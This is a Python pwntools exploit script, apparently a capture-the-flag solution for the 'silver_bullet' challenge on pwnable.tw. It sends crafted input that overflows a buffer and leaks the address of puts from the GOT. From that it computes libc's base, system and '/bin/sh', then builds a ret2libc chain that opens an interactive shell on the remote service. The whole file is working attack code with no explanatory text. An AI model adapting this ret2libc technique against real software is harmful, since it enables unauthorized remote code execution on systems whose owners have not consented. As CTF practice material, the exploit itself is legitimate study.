from pwn import *

server = remote('chall.pwnable.tw',10103)
elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')

# create bullet
server.recvuntil('Your choice :')
server.sendline('1')
server.recvuntil('Give me your description of bullet :')
server.sendline('a'*0x2f)
# power up
server.recvuntil('Your choice :')
server.sendline('2')
server.recvuntil('Give me your another description of bullet :')
server.sendline('b')

payload = '\xff'*3 + p32(0xdeadbeef)
payload += p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])
payload = payload.ljust(0x2f, 'a')
# power up
server.recvuntil('Your choice :')
server.sendline('2')
server.recvuntil('Give me your another description of bullet :')
server.sendline(payload)
# beat
server.recvuntil('Your choice :')
server.sendline('3')

server.recvuntil('win !!\n')
# put.plt
puts_addr = u32(server.recv(4))
# libc base
libcbase_addr = puts_addr - libc.symbols['puts']
# system
system_addr = libc.symbols['system'] + libcbase_addr
# /bin/sh 
binsh_addr = next(libc.search('/bin/sh')) + libcbase_addr

# create bullet
server.recvuntil('Your choice :')
server.sendline('1')
server.recvuntil('Give me your description of bullet :')
server.sendline('a'*0x2f)
# power up
server.recvuntil('Your choice :')
server.sendline('2')
server.recvuntil('Give me your another description of bullet :')
server.sendline('b')

payload = '\xff'*3 + p32(0xdeafbeef)
payload += p32(system_addr) + p32(elf.symbols['main']) + p32(binsh_addr)
payload = payload.ljust(0x2f, 'a')
# power up
server.recvuntil('Your choice :')
server.sendline('2')
server.recvuntil('Give me your another description of bullet :')
server.sendline(payload)
# beat
server.recvuntil('Your choice :')
server.sendline('3')
server.interactive()
